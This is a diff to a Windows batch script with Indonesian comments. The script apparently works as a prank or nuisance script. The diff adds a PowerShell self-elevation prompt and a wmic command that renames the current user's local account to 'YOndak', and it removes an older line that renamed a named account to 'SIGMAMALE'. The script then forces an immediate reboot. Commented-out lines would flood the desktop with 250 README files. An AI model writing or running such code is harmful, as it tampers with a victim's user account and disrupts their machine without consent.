@@ -1,8 +1,14 @@
 :: cek admin
 net session >nul 2>&1
 if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
+
+::rename user local
+set currentUser=%USERNAME%
+wmic useraccount where name='%currentUser%' rename YOndak
+
 
 ::Download gambar - reboot - set wallpaper ###
 ::@echo off
@@ -28,9 +34,6 @@ if %errorlevel% neq 0 (
 ::for /l %%i in (1,1,250) do (
 ::    echo sarcas1111 > "%USERPROFILE%\Desktop\README%%i.txt"
 ::)
-
-::rename user local
-powershell -Command "Rename-LocalUser -Name 'tmbaule' -NewName 'SIGMAMALE'"
 
 ::restart
 shutdown /r /t 0
